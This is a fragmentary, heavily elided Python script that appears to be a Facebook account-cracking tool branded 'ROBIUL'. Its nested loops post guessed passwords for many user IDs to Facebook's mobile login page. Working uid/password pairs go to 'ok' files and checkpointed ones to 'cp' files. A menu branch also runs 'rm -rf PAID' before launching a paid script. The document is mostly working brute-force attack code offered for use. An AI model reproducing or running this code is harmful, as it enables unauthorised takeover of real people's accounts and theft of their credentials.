...
def main_input():
    ...
    if mx == '1':
        ...
        print( '\x1b[1;92m        Member In ROBIUL Paid Commands ')
        ...
        os.system('rm -rf PAID')
        os.system(' cd PAID')
        os.system(' python2 ROBIUL.py')
        time.sleep(5)
        xox('\x1b[92;1m\n TOOL UPDATE SUCCESSFUL :)\n')
        time.sleep(2)
        main_system()
    elif mx == '7':
        os.system('xdg-open https://wa.me/+8801981442821')
        time.sleep(3)
        main_system()
    else:
        print( 'invild option')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print( '\x1b[1;92m[ROBIUL-OK] ' + coc + user + ' | ' + pass1)
                ok = open('ROBIUL random-ok.txt', 'a')
                ok.write(cid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(cid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print( '\x1b[1;91m[ROBIUL-CP] ' + coc + user + ' | ' + pass1)
                cp = open('ROBIUL random-cp.txt', 'a')
                cp.write(cid + ' | ' + pass1 + '\n')
                cp.close()
...
def mineExt():
    ...
    print( g + '[=] Extracting From ROBIUL : ' + my_line[:15])
    ...
    def main(arg):
        ...
        try:
            ...
            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                ...
                'login': 'submit' })
            if 'c_user' in rana.cookies.get_dict().keys():
                print( '\x1b[1;92m[ROBIUL-OK] ' + uid + ' | ' + pass1)
                ok = open('ROBIUL-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print( '\x1b[1;91m[ROBIUL-CP] ' + uid + ' | ' + pass1)
                cp = open('ROBIUL-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                b = rana.post('https://mbasic.facebook.com/login.php', data = {
                    ...
                    'login': 'submit' })
                if 'c_user' in rana.cookies.get_dict().keys():
                    print( '\x1b[1;92m[ROBIUL-OK] ' + uid + ' | ' + pass2)
                    ok = open('ROBIUL-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print( '\x1b[1;91m[ROBIUL-CP] ' + uid + ' | ' + pass2)
                    cp = open('ROBIUL-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    b = rana.post('https://mbasic.facebook.com/login.php', data = {
                        ...
                        'login': 'submit' })
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print( '\x1b[1;92m[ROBIUL-OK] ' + uid + ' | ' + pass3)
                        ok = open('ROBIUL-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print( '\x1b[1;91m[ROBIUL-CP] ' + uid + ' | ' + pass3)
                        cp = open('ROBIUL-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        b = rana.post('https://mbasic.facebook.com/login.php', data = {
                            ...
                            'login': 'submit' })
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print( '\x1b[1;92m[ROBIUL-OK] ' + uid + ' | ' + pass4)
                            ok = open('ROBIUL-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print( '\x1b[1;91m[ROBIUL-CP] ' + uid + ' | ' + pass4)
                            cp = open('ROBIUL-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                                ...
                                'login': 'submit' })
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print( '\x1b[1;92m[ROBIUL-OK] ' + uid + ' | ' + pass5)
                                ok = open('ROBIUL-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print( '\x1b[1;91m[ROBIUL-CP] ' + uid + ' | ' + pass5)
                                cp = open('ROBIUL-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                print( '\x1b[1;97m[ROBIUL-CP] ' + uid + ' | ' + pass1)
                cp = open('ROBIUL-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    ...
                    print( '\x1b[1;97m[ROBIUL-CP] ' + uid + ' | ' + pass2)
                    cp = open('ROBIUL-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        print( '\x1b[1;97m[ROBIUL-CP] ' + uid + ' | ' + pass3)
                        cp = open('ROBIUL-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            print( '\x1b[1;97m[ROBIUL-CP] ' + uid + ' | ' + pass4)
                            cp = open('ROBIUL-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                print( '\x1b[1;97m[ROBIUL-CP] ' + uid + ' | ' + pass5)
                                cp = open('ROBIUL-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                b = rana.post('https://mbasic.facebook.com/login.php', data = {
                                    ...
                                    'login': 'submit' })
                                if 'c_user' in rana.cookies.get_dict().keys():
                                    print( '\x1b[1;92m[ROBIUL-OK] ' + uid + ' | ' + pass6)
                                    ok = open('vaw-ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'checkpoint' in rana.cookies.get_dict().keys():
                                    print( '\x1b[1;91m[ROBIUL-CP] ' + uid + ' | ' + pass6)
                                    cp = open('ROBIUL-cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
